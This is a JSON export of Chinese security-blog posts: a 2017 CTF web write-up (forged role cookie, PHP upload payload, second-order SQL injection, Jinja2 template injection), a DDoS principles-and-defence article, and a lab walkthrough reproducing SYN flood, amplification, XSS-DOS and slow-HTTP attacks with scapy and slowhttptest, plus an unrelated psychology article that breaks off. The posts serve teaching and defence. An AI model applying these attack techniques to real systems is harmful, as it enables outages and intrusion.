[{"title":"2017广东省强网杯Web全解","slug":"QWBCTF","date":"2017-09-11T07:11:00.000Z","updated":"2017-09-11T07:23:27.274Z","comments":true,"path":"2017/09/11/QWBCTF/","link":"","permalink":"https://mochazz.github.io/2017/09/11/QWBCTF/","excerpt":"","text":"第一题题目给了一个损坏的jsfuck，修复一下解密即可，将开头[[改成[][,然后转换成代码即可看到flag。注意这里不要将代码直接放在控制台运行，因为flag被赋值给一个变量了。解密地址：https://enkhee-osiris.github.io/Decoder-JSFuck/ 第二题访问链接，发现被禁止访问，抓包发现，role参数有点奇怪role=Zjo1OiJ0aHJmZyI7根据题目提示我是谁？我在哪？我要干什么？将s:5”admin”进行rot13加密再base64加密发送数据包，就以admin身份登录进来了。查看网页源代码发现需要POST数据给服务器那就随便POST数据filename=test1.php&amp;data=&lt;?php phpinfo(); ?&gt;发现被拦截，但是POST数据filename=test1.txt&amp;data=&lt;?php phpinfo(); ?&gt;可以，而且给出了路径，也可以访问到。这里应该是做了限制。可以猜测后台代码使用了file_put_contents()函数，于是根据PHP手册介绍，第二个参数可以是数组如果第二个参数传入的是数组，则会将他们以字符串的形式拼接起来，测试如下：获取路径后访问既得flag 第三题考察sql二次注入，随便注册即可登录，登录后发现有个check按键可以查询有多少人的号码和你一样，这样必定要用到电话号码，并查询数据库，而电话号码只能是数字。所以，思路就是将sql语句转换成16进制进行注册，这样在查询的时候就会执行我们构造的sql语句 第四题考察jinjia2模板注入注册完后，在donate.php处可以填写图片url，以及用户名。随便填报错，发现使用后台了jinja2模板。google一下，get姿势，具体看这篇文章：CSAW-CTF Python sandbox write-up下面思路就是用python语句进行命令执行，当然后台过滤了一些关键词jinja2注入参考文章：CSAW-CTF Python sandbox write-up利用 Python 特性在 Jinja2 模板中执行任意代码","categories":[{"name":"CTF竞赛训练","slug":"CTF竞赛训练","permalink":"https://mochazz.github.io/categories/CTF竞赛训练/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://mochazz.github.io/tags/CTF/"}]},{"title":"DDOS原理与防御","slug":"DDOS1","date":"2017-09-10T23:15:00.000Z","updated":"2017-09-11T01:59:22.390Z","comments":true,"path":"2017/09/11/DDOS1/","link":"","permalink":"https://mochazz.github.io/2017/09/11/DDOS1/","excerpt":"","text":"首发地址:https://xianzhi.aliyun.com/forum/read/2078.html0X00前言暑假无聊，找了一家公司实习，打算学点东西。这家公司早些年是做抗DDOS设备的，培训的时候就很粗略的讲了部分原理，但是我却对DDOS产生了浓厚的兴趣。一但有了兴趣，便有了研究下去的动力。所以我开始在网络上搜集各种DDOS文章、书籍，学习的同时还做了记录，在此与大家分享，文中必要之处，我会连同协议的工作方式及报文格式一并讲解，这样才能更好的理解攻击触发点。 0X01DDOS简介DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。骇客通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源的正常访问。 0X02DDOS危害出口带宽堵死游戏掉线导致客户流失服务器连接数多，连接资源被耗尽服务器卡、慢、死机、无法连接 0X03攻击来源高性能服务器配合发包软件可联网的设备(如打印机、摄像头、电视等等)移动设备(数量多，增长速度快，其高性能利于组建僵尸网络)个人PC(存在漏洞的PC或一些黑客迷自愿成为DDOS一员)骇客控制的僵尸网络(僵尸网络又分为IRC型、HTTP型、P2P型) 0X04流量特点IP地址随机或固定某些IP段随机没有完整完成三次握手地址多数是伪造的请求数量大、快 0X05导致DDOS原因人类因素金钱利益政治冲突宗教冲突为求出名 非人类因素带宽上限协议缺陷设备性能上限应用性能上限系统性能上限 0X06攻击类型及防御Smurf攻击攻击者向网关发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图防护方案：禁止路由器广播ICMP请求包；禁止操作系统对广播发出的ICMP请求包做出响应；配置防火墙静止来自你所处网络外部的ping包 TearDrop攻击在了解这种攻击之前，需要先知道什么是IP fragmentation（数据包分片）。数据在网络中传输必定会产生数据包被分片，因为每种网络都有不同的最大单个数据包的大小，也就是常说的MTU（Maximum Transmission Unit，最大传输单元）。当要传输的数据超过你要通信的那台主机所处网络的MTU时，数据包就会被分片进行传输，然后在到达目的地再重新组装成原来的数据包，下面是数据包分片重组过程TearDrop攻击，就是通过设置错误的片偏移，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包这种攻击主要对旧的windows版本和Linux版本有效，防护的话，可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。例如这个：分片重组检查算法。 Land Attack攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。攻击过程如下防御方案参考如下：这种攻击对早期系统有效。通过设置防火墙和路由规则，检测源IP与目的IP相同的数据包，丢弃、过滤这种数据包。 SYN FLOOD攻击SYN FLOOD攻击是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。SYN FLOOD攻击图示如下防御：SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。 ACK FLOOD攻击ACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。 第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 第二种：利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。防御方案可参考如下：采用CDN进行流量稀释；避免服务器IP暴露在公网上；通过限速或动态指纹的方式；利用对称性判断来分析出是否有攻击存在；在连续收到用户发送的ACK包时，中断回话，让其重连。 UDP FLOOD攻击UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。防御方案：限制每秒钟接受到的流量(可能产生误判)；通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。 NTP放大攻击NTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精度的时间校正，使用UDP123端口进行通信。通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。下面是NTP放大攻击示意图总结一下这种攻击产生的原因，请求与响应数据包不等价；UDP协议的通信模糊性（无数据传输确认机制）；以及NTP服务器的无认证机制。再来谈谈防御方案：使用防 DDoS 设备进行清洗；加固并升级NTP服务器；在网络出口封禁 UDP 123 端口；通过网络层或者借助运营商实施 ACL 来防御；关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加disable monitor选项。 DNS放大攻击DNS(Domain Name System，域名系统)，由于使用IP地址来记忆各个网站比较困难，所以就产生了使用主机名称来表示对应的服务器，主机名称通过域名解析的过程转换成IP地址。下面来看一下DNS报文格式，以便了解攻击发生在何处。报文首部格式报文首部各字段含义如下，其中绿色高亮是攻击点之一，之后会分析下面是问题记录中查询类型可设置的值，我们发现最后一个ANY类型会请求所有记录，这也是一个攻击点DNS查询可分为递归查询和迭代查询，下面是DNS迭代查询图再来看DNS递归查询图从DNS数据包结构以及DNS递归查询过程，我们就可以大致分析出攻击原理。首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图防御的话，可以参考以下几点：联系ISP清洗上游流量；DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；对单个IP的查询速率做限制；拥有足够的带宽承受小规模攻击；关闭DNS服务器的递归查询；利用防火墙等对ANY Request进行过滤。 SNMP放大攻击SNMP(Simple Network Management Protocol，简单网络管理协议)，是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维和互联网设备，它使用UDP161端口进行通信。攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。常见的默认通信字符串如public、private以及一些厂商默认的通信字符串。GetBulk请求是在SNMPv2中添加的的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点。下面来看一下SNMP的PDU格式攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。看一下SNMP的攻击图可以采取以下措施进行防御：禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；更改默认的通信字符串；修改默认端口161；隐藏开启SNMP设备的公网IP TFTP放大攻击TFTP（Trivial File Transfer Protocol，简单文件传输协议），使用UDP 69端口进行通信，由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文，以下是TFTP传输文件过程图超时重传机制可以看到，TFTP协议将数据分成好多个数据块进行传输，每个数据块最大为512字节，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了。来看一下TFTP放大攻击示意图防御方案可参考如下：不要将TFTP服务器暴露在公网上；对流经TFTP服务的流量进行入侵检测；将重传（数据包）率设置为1；只为信任域内的主机提供服务。 CC攻击CC攻击（ChallengeCollapsar）又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。防御方案：必要时将网页做成静态，减少数据库的使用；限制连接数量；修改最大超时时间；让用户手动输入验证码；在response报文中添加特殊字段，验证IP合法性；屏蔽频繁访问服务器的主机IP。 HTTP慢速攻击Slow HTTP Dos AttACKs（慢速HTTP拒绝服务攻击），黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类，一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。HTTP慢速攻击还可以细分成以下几种攻击方式. Slowloris攻击方式HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\\r\\n\\r\\n。然而使用非正常的\\r\\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（Carriage Return Line Feed）表示回车换行 Slow post攻击方式在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTP BODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 Slow read攻击方式攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 Apache range header攻击这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。上面这4种攻击方式，也可以参考这篇文章：CC攻击。了解了攻击原理，我们就可以有针对性地进行防御，这里说一下apache的防护策略：设置并使用以下模块mod_reqtimeout模块，控制请求数据传输的超时时间及最小速率，防护配置如下mod_qos模块，Apache的一个服务质量控制模块，用户可配置各种不同阈值，防护配置如下mod_security模块，一个开源的WAF模块，有专门针对慢速攻击防护的规则，防护配置如下以上是针对Apache的一些防护策略，至于其他中间件的防护，可以参考这篇文章：How to Protect Against Slow HTTP AttACKs XSS-DOS利用网站存在的存储型XXS漏洞，在网站中插入恶意的javascript代码。代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求。客户端访问已插入恶意的javascript代码的页面后，抓包截图如下由于这种攻击的是由存储型XSS导致的，我们再防御方面就要考虑如何防御存储型XSS。防御策略如下：对用户的输入以及url参数进行特殊字符过滤；对输出内容进行编码转换；结合黑白名单机制。 时间透镜攻击通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。这种攻击其实我也还弄不太懂，详细信息可以阅读这篇paper：Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks，或者看这个视频，还有这份中文分析：时间透镜及其在脉冲拒绝服务攻击的应用。看一下freebuf上的一个分析图防御方案：增加抖动，干扰攻击路径，使得数据包无法预期到达；由运营商禁止源路由。其他防御措施：采用高性能的网络设备；充足的网络带宽保证；升级主机服务器硬件；避免将服务器的真实IP暴露在公网中；使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的。然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用anycast技术来防御。 0X07总结这篇文章是自己对DDOS学习的一个总结，当中参考了不少文章书籍，当然还有很多类型的DDOS文中未提及，需要再深入学习，文中若有原理性错误，还望大家指出修正。如果大家有什么好的书籍或关于这方面的资料，欢迎推荐、交流(QQ：379032449)，文章仅用于研究，切勿用在非法用途。在下一篇文章中，我将还原大部分DDOS攻击的场景。参考：CC攻击HTTP FLOODUDP FLOODSNMP GETBULKSMURF DDOS ATTACKDNS Amplification AttACKNTP Amplification AttACKs Using CVE-2013-5211SNMP REFLECTION/AMPLIFICATIONHow To Mitigate Slow HTTP DoS AttACKs in Apache HTTP ServerHow to Protect Against Slow HTTP AttACKsTemporal Lensing and its Application in Pulsing Denial-of-Service Attacks《TCP-IP协议族(第4版)》《破坏之王-DDoS攻击与防范深度剖析》","categories":[{"name":"拒绝服务","slug":"拒绝服务","permalink":"https://mochazz.github.io/categories/拒绝服务/"}],"tags":[{"name":"DDOS","slug":"DDOS","permalink":"https://mochazz.github.io/tags/DDOS/"}]},{"title":"DDOS攻击模拟复现","slug":"DDOS2","date":"2017-09-10T23:15:00.000Z","updated":"2017-09-11T02:00:44.428Z","comments":true,"path":"2017/09/11/DDOS2/","link":"","permalink":"https://mochazz.github.io/2017/09/11/DDOS2/","excerpt":"","text":"首发地址:https://xianzhi.aliyun.com/forum/read/2079.html0X00前言我在上一篇文章中，总结了大多数DDOS攻击的原理和防御。这篇文章，我将分享大部分DDOS攻击的实现以及每个实验环境的搭建步骤。严格来说我做的实验应该叫做DOS攻击，但毕竟资源有限，如果多台主机使用同种方式攻击服务器，同样会产生DDOS的效果，所以我还是把本次实验都叫做DDOS吧。下面所编写的脚本基于python2.7环境运行，文章仅供参考研究，切勿用于非法用途。 0X01SYN FLOOD攻击环境准备我们选取metasploitable2作为被攻击服务器，在SYN FLOOD攻击发起之前，可以正常访问服务器上的web服务 模拟攻击SYN FLOOD攻击的原理就是阻断TCP三次握手的第三次ACK包，即不对服务器发送的SYN+ACK数据包做出应答。由于服务器没有收到客户端发来的确认响应，就会一直保持连接直到超时，当有大量这种半开连接建立时，即造成SYN Flood攻击。所以我们就可以按照这个思路进行数据包构造，这里我使用python的scapy模块来模拟发包在发送数据包的同时，我们打开wireshark抓包，可以看到目标服务器成功给我们返回SYN+ACK数据包，但是第三个数据包确实RST数据包而不是ACK数据包，这是怎么回事？其实这个RST数据包是系统自己发送的，原因在于一开始的SYN数据包是我们使用scapy发出的，并不是操作系统自己主动发出的，所以当操作系统收到一个SYN+ACK数据包时，它会认为这个连接不是我发出的，就会主动拒绝连接，并返回RST数据包。既然这样，我们可以使用linux下的iptables命令禁止系统自动给目标发送RST数据包，从而达到建立半开连接的效果，命令如下接下来我们就可以把刚刚构造数据包的思路加上多线程模块写成一个SYN FLOOD攻击脚本，代码如下脚本使用方法在第15行，执行我们的syn_flood.py脚本后，发现目标服务器的web应用已经无法访问打开wireshark抓包，可以看到抓取到大量的SYN请求数据包，而且已经没有RST数据包了我们再登录服务器(metasploitable2)上，查看服务器所建立的连接。使用命令netstat -pantu | grep SYN查看已建立的SYN连接数，可发现此时已建立了大量连接 0X02DNS放大攻击复现数据包构造思路首先，我们需要观察一下DNS递归查询数据包的报文格式。使用dig命令发送DNS查询报文，并同时开启wireshark抓包分析通过wireshark可以看到返回的数据包大约是请求数据包的7倍。不同域名，dig命令查询所返回的数据包大小不一样 模拟攻击接下来，我们使用scapy伪造源地址为被攻击目标IP 向DNS服务器发起递归查询，如果向大量的DNS服务器发起递归查询，则DDOS攻击效果更明显。d.rd=1 rd：Recursion desired，当rd=1时表示进行递归查询使用wireshark抓包查看效果，并验证构造的数据包是否正确确认数据包构造无误后，就可以开始编写脚本进行DNS放大攻击，代码如下攻击示例在受害主机上用wireshark抓取数据包查看效果，可以看到DNS服务器返回了大量的查询响应包 0X03TFTP放大攻击复现环境准备选择ubuntu安装TFTP服务，并上传一个文件到TFTP服务器的根目录客户端与服务器建立连接过程 模拟攻击在攻击机(kali)上使用scapy构造TFTP数据包，并同时打开wireshark抓包分析构造的数据包是否正确同时TFTP服务器上也使用wireshark抓包，可以看到TFTP服务器将数据包的第一个分块返回了6次，原因在于受害主机并未对TFTP发出的数据包做出ACK响应，TFTP由于未收到确认应答，就启动它的重传机制直至超时，返回数据包的大小取决于TFTP所传送的文件大小。受害主机(ubuntu)上使用wireshark抓包，发现接受到UDP协议传来的6个数据包这里计算一下一个数据包的放大倍数：558*6/62=54，如果在加上多线程模块，配合多个主机发包，放大倍数可想而知。 0X04NTP放大攻击复现环境准备我们准备一个BodhiLinux模拟公网上开启了NTP服务的服务器打开BodhiLinux，安装NTP服务这里有个小问题，默认apt-get install ntp会安装ntp-4.2.8p6，然而这个版本无法用于本次实验，因为ntp4.2.7及以上的版本中已经禁止了monlist功能，所以需要安装ntp-4.2.6p5，解决方法换Ubuntu14.04.4默认更新源，再用apt-get install ntp即可。Ubuntu14.04.4默认更新(http://www.cnblogs.com/zlslch/p/6860229.html)查看UDP123端口是否开放：编辑/etc/ntp.conf文件，开启NTP服务器monlist查询功能：重启ntp服务，配置文件才会生效： 模拟攻击此时开启kali模拟黑客扫描公网上可用的NTP服务器，使用nmap可完成该目的当黑客确定目标后，会扫描目标的UDP123端口服务，确认其UDP123端口是否为NTP服务查看对方NTP服务器是否开启monlist查询功能运行上面命令的同时，开启wireshark抓包，可抓取NTP数据包，用于之后的数据包构造通过scapy按照NTP数据包格式构造发包再次在kali(攻击机)上用wireshark抓包，验证构造的NTP数据包是否有误Ubuntu(受害主机)上也用wireshark抓包，验证是否收到NTP服务器返回的数据包可以看到，受害主机成功接受从NTP服务器返回的查询报文。这里发送一个NTP数据包，收到也只有一个NTP数据包。理论上应该会收到100个数据包，每6个IP封装在1个数据包内，因为开头我们查询的时候，发现就只有6个IP与我们的NTP服务器进行了交互，所以就只能收到一个数据包。所以，现在的思路就是增加NTP服务器保存的IP表长度。使用ntpdate NTP服务器IP 这条命令可以与NTP服务器进行交互，并且NTP服务器的IP列表中会多一个运行这条命令主机的IP。图忘记截了，大家自己试一下，运行这条命令的同时，打开wireshark抓包观察数据包结构。使用scapy如下构造包可以看到我们成功将192.168.100.101添加至NTP服务器的IP列表里既然这样，我们就可以写一个脚本，将NTP服务器的IP列表增大到600，脚本如下脚本运行情况再次查看NTP服务器的IP列表，已成功增大IP列表长度去掉开头两行非IP行，刚好是600个IP下面我们再来试一下发送一个NTP查询包，是否能返回100个数据包(总共600个IP，每6个IP封装在一个数据包中)攻击机(kali)使用scapy构造数据包，并打开wireshark抓包观察数据包正确性受害主机(ubuntu)wireshark抓包截图，可以看到刚好收到100个数据包我们可以计算一下放大倍数：482*100/90=535，哇！瞬间变得有趣多了。 0X05SNMP放大攻击复现环境准备在windows2003上安装SNMP服务先插入iso文件，在点击确定对安装好的SNMP进行配置 模拟攻击开启scapy开始构造SNMP GetBulk请求使用wireshark抓包分析如果需要返回更多的数据，我们可以修改SNMPbulk函数里的max_repetitions属性的值，至于攻击脚本，按照上面其他类型的放大攻击依葫芦画瓢即可。 0X06XSS-DOS环境准备准备一个开启了web服务的主机，这里选择Ubuntu做演示WebSocket协议是基于TCP的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信(允许服务器主动发送信息给客户端)。 模拟攻击这里只是演示攻击，为了方便就不利用存储型XSS插入恶意代码，直接在Ubuntu的/var/www/html/目录下添加XSS-DOS.php，代码如下然后使用我们的主机访问http://190.168.100.102/XSS-DOS.php。192.168.100.102是Ubuntu的IP，192.168.100.105是我本机的IP，由下图可看到，当我本机访问目标服务器时，两者之间建立了大量的连接如果这时有大量的主机访问http://190.168.100.102/XSS-DOS.php，服务器的tcp连接池就会被占满，最终导致拒绝服务。大家可以观察到，在我们浏览器访问目标服务器一段时间后，我们的浏览器崩溃了，这是因为我们与目标建立的大量的TCP连接，这对我们自己主机也是非常消耗内存的，所以说这种攻击属于拼资源型攻击。 0X07HTTP慢速攻击环境准备在攻击端安装slowhttptest工具用于HTTP慢速攻击：可以使用-h选项来查看使用说明：这个工具提供了多种方式攻击，细节如下 Slowloris攻击方式查看服务端建立的连接数：此时服务器上的web服务已经完全不能访问了。抓包验证攻击手法：结尾添加了一个X-*，这样看我们可能看不出什么，我们将这组数据转换成原始数据看看：我们看到结尾是0d0a，0d表示\\r,0a表示\\n，也就是说结尾是\\r\\n。而正常的请求头结尾应该是\\r\\n\\r\\n，如果以\\r\\n结尾，服务器就会认为客户端的数据还没传输完，就需要一直保持连接直到超时。 Slow post攻击方式 Slow read攻击方式我们通过设置TCP接收窗口大小为32(-z 32)来限制每次服务器给我们发送的数据大小。通过抓包分析，我们可以观察到目标服务器每次只给我们返回32字节的数据： Apache range header攻击虽然实验没有成功将服务器宕机，但是还是有必要了解这种攻击方式，我们还是来抓包看一下：可以看到客户端发送的HTTP请求头中添加了range字段，大文件分成好多个小段进行传输，这就会消耗服务器大量CPU和内存资源。 0X08总结终于把大部分的DDOS攻击实现了，在这过程中，自己本身也查阅了大量的书籍、博文。从原理到实践，当中有些东西还需要继续深入下去，还有很多实验还没实现，对于DDOS的研究还将继续，后续会更新在个人博客，如果大家有什么好的书籍或关于这方面的资料，欢迎推荐交流(QQ：379032449)。文章仅用于研究，切勿用在非法用途。","categories":[{"name":"拒绝服务","slug":"拒绝服务","permalink":"https://mochazz.github.io/categories/拒绝服务/"}],"tags":[{"name":"DDOS","slug":"DDOS","permalink":"https://mochazz.github.io/tags/DDOS/"}]},{"title":"你是在独立思考，还是在被洗脑？","slug":"article1","date":"2017-09-07T08:55:00.000Z","updated":"2017-09-07T09:07:35.084Z","comments":true,"path":"2017/09/07/article1/","link":"","permalink":"https://mochazz.github.io/2017/09/07/article1/","excerpt":"","text":"文章转载自：http://www.xinli001.com/info/100373218你有过这样的经历吗？老板走过来，急匆匆丢给你一句：帮我整理一下那个客户的资料，下午给我。你抬头，应道「好好好」。老板扬长而去。你转念一想：等等，哪个客户？什么资料？整理什么东西？我不知道啊……你望向老板，想问，却发现早已不见踪影。怎么办？只能凭自己的理解做。在我这几年带项目和做咨询的经历中，这种情况极其常见。许多项目，就是因为沟通不充分，信息传递失效，导致做了许多无用功，在这些细节上，白白虚耗了大量时间、精力、人力。不过，说实话，这还真不能完全怪老板。为什么呢？因为这是大脑天生的一个弱点。心理学上，有一个有趣的概念，来描述这种现象，叫做「知识的诅咒」。它指的是：当我们熟知一个信息之后，就很难跳出这个信息的框架去思考问题了。如同前面的例子，当老板一心想着某个客户的时候，他就会下意识地认为：大家的想法， 跟他是一致的；他只要说「那个客户」，大家都知道指的是谁。简而言之，在老板的心中，「那个客户」，跟客户的名字（假设是 L先生），建立了一个「联结」。当他说「那个客户」的时候，他心里想的，实际是「L先生」。很多从 4A公司出来的人，说话总会带着中英混杂的「4A腔」。这是因为他们故意的吗？其实不是。是因为真的说太多了，已经形成了固定的「联结」。这就是我们大脑记忆事物的方式。一个神经元，代表一个概念。当两个概念成对出现时，它们之间就会产生一个联结。出现的次数越多，越频繁，联结就越紧密。久而久之，这个联结就会被内化，我们就会将它们视为同一个事物。如何削弱这种联结呢？答案是，在它们之间，插入一个第三者。当其中某一个概念，跟第三者建立起联结，原本的联结，就会慢慢被削弱，乃至消除。这很现实，也很残酷。上周日的文章里面，我提到：不要沉溺于娱乐，它会摧毁你的深度思考能力，让你再也坐不住，无法专注地去读书、学习、思考。有朋友表示不理解，其实很简单。当我们玩游戏、看综艺、看肥皂剧时，我们处于低投入、高回报的状态，我们习惯了它们对大脑的刺激，沉浸在它们为我们制造的愉悦感里面。久而久之，我们就会把这些娱乐，跟愉悦感建立起联结。为什么我们总是管不住自己的手，无意识地打开游戏、综艺、剧集？就是因为，我们的大脑需要愉悦感，渴望新鲜的刺激。那么，它就会按照已有的「联结」，驱使我们去行动。所以，如何让自己能够静下心去学习？不是靠意志力，那是没用的 —— 你必须在学习中寻找到愉悦感。一方面，减少愉悦感与娱乐的联结，另一方面，增强愉悦感与学习的联结。以我自己为例，每当通过读书，学到新的知识点，弄懂一个概念时，那种成就感是无与伦比的，远胜过任何娱乐。那么，我需要强迫自己去读书吗？不需要，因为读书已经成了一种生活方式。心理学中有一个非常经典的「吊桥效应」，也是同样的道理。当两个人约会时，如果经历一些惊心动魄的事情 —— 比如一起走过一座吊桥，这时，身体会分泌肾上腺素，来调整整个人的状态，以应对可能存在的危险。你会感到心跳加速，整个人被完全唤醒。但是，你的大脑，就会把这种状态，归因于「你和 TA 